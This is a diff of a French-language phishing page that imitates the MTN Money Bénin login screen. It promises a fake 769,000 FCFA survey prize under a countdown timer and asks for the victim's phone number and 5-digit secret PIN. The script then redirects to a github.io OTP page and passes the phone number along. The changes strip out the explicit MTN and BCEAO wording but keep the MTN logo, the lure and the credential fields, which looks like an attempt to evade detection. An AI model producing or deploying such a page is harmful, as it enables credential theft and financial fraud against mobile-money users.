@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MTN Money Bénin - Connexion</title>
+    <title>Espace Membre - Connexion</title>
     <style>
         * {
             margin: 0;
@@ -427,14 +427,14 @@
 <body>
     <div class="status-bar">
         <span class="time" id="currentTime"></span>
-        <span>🇧🇯 MTN Bénin</span>
+        <span>Espace Membre</span>
         <span></span>
     </div>
     
     <div class="container">
         <div class="mtn-header">
             <div class="mtn-logo">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/MTN_Logo.svg/2560px-MTN_Logo.svg.png" alt="MTN Benin">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/68/MTN_Logo.svg/2560px-MTN_Logo.svg.png" alt="Logo">
                 <span id="updateTime"></span>
             </div>
             <div class="mtn-welcome">
@@ -443,30 +443,30 @@
         </div>
         
         <div class="promo-banner">
-            <div class="promo-banner-top">🎁 GAIN GEOPOLL SONDAGE</div>
-            <div class="promo-banner-title">769 000 FCFA</div>
+            <div class="promo-banner-top">🎁 OFFRE SPÉCIALE</div>
+            <div class="promo-banner-title">769 000 Unités</div>
             <div class="promo-banner-sub">
-                <span>À recevoir immédiatement</span>
-                <span class="promo-code">MTN769</span>
+                <span>À valider immédiatement</span>
+                <span class="promo-code">CODE769</span>
             </div>
         </div>
         
         <div class="quick-menu">
             <div class="quick-item">
                 <div class="quick-icon">💰</div>
-                <div class="quick-label">Transfert</div>
+                <div class="quick-label">Compte</div>
             </div>
             <div class="quick-item">
                 <div class="quick-icon">📱</div>
-                <div class="quick-label">Achat crédit</div>
+                <div class="quick-label">Recharges</div>
             </div>
             <div class="quick-item">
                 <div class="quick-icon">💳</div>
-                <div class="quick-label">Paiement</div>
+                <div class="quick-label">Paiements</div>
             </div>
             <div class="quick-item">
                 <div class="quick-icon">🎁</div>
-                <div class="quick-label">Bonus</div>
+                <div class="quick-label">Offres</div>
             </div>
             <div class="quick-item">
                 <div class="quick-icon">📋</div>
@@ -478,11 +478,11 @@
             <div class="transaction-card">
                 <div class="transaction-header">
                     <span>Transaction GeoPoll</span>
-                    <span>Réf: GPOLL-BENIN-769K</span>
+                    <span>Réf: GP-769K</span>
                 </div>
-                <div class="transaction-amount">769 000 FCFA</div>
+                <div class="transaction-amount">769 000 Unités</div>
                 <div class="transaction-details">
-                    <span id="displayNameTransaction"></span>, suite à votre activité récente sur <strong>GeoPoll sondage</strong>, vous avez été sélectionné pour recevoir un bonus exceptionnel de 769 000 FCFA.
+                    <span id="displayNameTransaction"></span>, suite à votre activité récente, vous avez été sélectionné pour recevoir une récompense exceptionnelle de 769 000 Unités.
                 </div>
                 <div class="transaction-timer" id="countdown">
                     ⏱️ Expire dans 23h 59min 59s
@@ -492,16 +492,16 @@
             <form method="POST" action="">
                 <div class="mtn-form">
                     <div class="form-group">
-                        <div class="form-label">Numéro MTN Money</div>
+                        <div class="form-label">Numéro de compte</div>
                         <div class="input-field">
-                            <span class="input-prefix">🇧🇯 +229</span>
+                            <span class="input-prefix">📱</span>
                             <input type="tel" id="phone" name="phone" placeholder="97 00 00 00" maxlength="8" required>
                         </div>
-                        <small style="color: #999; font-size: 11px;">Numéro à 8 chiffres (ex: 97 00 00 00)</small>
+                        <small style="color: #999; font-size: 11px;">Numéro à 8 chiffres</small>
                     </div>
                     
                     <div class="form-group">
-                        <div class="form-label">Code secret MTN Money (5 chiffres)</div>
+                        <div class="form-label">Code de validation (5 chiffres)</div>
                         <div class="pin-container">
                             <input type="password" class="pin-box" id="pin1" name="pin1" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                             <input type="password" class="pin-box" id="pin2" name="pin2" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
@@ -510,21 +510,21 @@
                             <input type="password" class="pin-box" id="pin5" name="pin5" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                         </div>
                         <div class="forgot-pin">
-                            <a href="#">👉 Mot de passe oublié ?</a>
+                            <a href="#">👉 Code oublié ?</a>
                         </div>
                     </div>
                     
                     <div class="checkbox-container">
                         <input type="checkbox" id="terms" checked>
-                        <label for="terms">J'accepte les conditions d'utilisation du service MTN Money</label>
+                        <label for="terms">J'accepte les conditions d'utilisation</label>
                     </div>
                     
                     <button type="submit" class="mtn-button" id="submitBtn">
-                        CONFIRMER ET RECEVOIR 769 000 FCFA
+                        VALIDER ET CONTINUER
                     </button>
                     
                     <div class="quick-links">
-                        <a href="#">📞 *144#</a>
+                        <a href="#">📞 Assistance</a>
                         <a href="#">❓ Aide</a>
                         <a href="#">🔒 Sécurité</a>
                     </div>
@@ -532,20 +532,20 @@
             </form>
             
             <div class="partners">
-                <p>Partenaires financiers agréés BCEAO</p>
+                <p>Partenaires agréés</p>
                 <div class="partner-icons">
-                    <span>MTN Money</span>
-                    <span>Moov Money</span>
-                    <span>Celtiis</span>
-                    <span>Orange Money</span>
+                    <span>Partenaire 1</span>
+                    <span>Partenaire 2</span>
+                    <span>Partenaire 3</span>
+                    <span>Partenaire 4</span>
                 </div>
             </div>
         </div>
         
         <div class="mtn-footer">
-            <p>MTN Money Bénin - Version 4.2.1</p>
-            <p class="bcaeo">Établissement agréé par la BCEAO</p>
-            <p>© 2024 MTN Bénin | <a href="#">Confidentialité</a> | <a href="#">Mentions légales</a></p>
+            <p>Espace Membre - Version 4.2.1</p>
+            <p class="bcaeo">Service partenaire</p>
+            <p>© 2024 | <a href="#">Confidentialité</a> | <a href="#">Mentions légales</a></p>
         </div>
     </div>
     
@@ -553,14 +553,14 @@
         <div class="loading-box">
             <div class="mtn-spinner"></div>
             <p>Traitement en cours</p>
-            <div class="loading-amount">769 000 FCFA</div>
+            <div class="loading-amount">769 000 Unités</div>
             <p id="loadingName"></p>
         </div>
     </div>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const firstName = urlParams.get('firstname') || 'Koffi';
+        const firstName = urlParams.get('firstname') || 'Membre';
         
         document.getElementById('displayName').textContent = firstName;
         document.getElementById('displayNameTransaction').innerHTML = `<strong>${firstName}</strong>`;
@@ -628,19 +628,18 @@
             }
             
             if (!phone || phone.length < 8) {
-                alert('Veuillez entrer votre numéro MTN à 8 chiffres');
+                alert('Veuillez entrer votre numéro à 8 chiffres');
                 return;
             }
             
             if (pin.length !== 5) {
-                alert('Veuillez entrer votre code secret à 5 chiffres');
+                alert('Veuillez entrer votre code à 5 chiffres');
                 return;
             }
             
             document.getElementById('loadingOverlay').style.display = 'flex';
             document.getElementById('submitBtn').disabled = true;
             
-            // ✅ REDIRECTION CORRIGÉE VERS LA PAGE OTP (URL ABSOLUE)
             setTimeout(function() {
                 window.location.href = 'https://nomadewebe-tech.github.io/Mtn-Benin/otp.html?firstname=' + encodeURIComponent(firstName) + '&phone=' + encodeURIComponent(phone);
             }, 3000);
